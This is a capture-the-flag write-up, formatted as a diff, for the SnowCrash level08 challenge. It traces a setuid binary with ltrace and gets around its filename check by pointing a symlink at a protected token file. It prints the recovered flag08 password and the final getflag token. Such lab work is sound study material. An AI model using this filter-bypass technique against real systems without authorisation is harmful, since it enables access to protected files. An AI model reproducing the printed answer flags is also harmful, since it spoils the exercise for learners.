@@ -1,0 +1,54 @@
+In this level we have an executable and a file
+
+Trying to launch the executable gets us a message saying that we need to launch
+it with a file as parameter.
+
+Let's try to give it the token file present in the home.
+
+We don't have right on it.
+Hum.
+
+That means it's doing something at least, let's find out what with ltrace
+
+level08@SnowCrash:~$ ltrace ./level08
+__libc_start_main(0x8048554, 1, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+printf("%s [file to read]\n", "./level08"./level08 [file to read]
+)                              = 25
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                            = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+level08 is looking at the name of our parameter and looks for the string "token"
+But in the end it looks for "token" in the argument and stop the execution if it finds it.
+
+Let's try to create a file not named with token inside and give it as parameter.
+
+touch /tmp/abc
+./level08 /tmp/abc
+
+and no output.
+
+So let's create link file to token.
+You remember your shell piscine ? Remember symlink ? I do !
+
+ln -s /home/user/level08/token /tmp/flag
+
+./level08 /tmp/flag
+
+quif5eloekouj29ke0vouxean
+
+Is this the flag ? No. We haven't launch getflag.
+Token only contains the password to log as flag08.
+
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
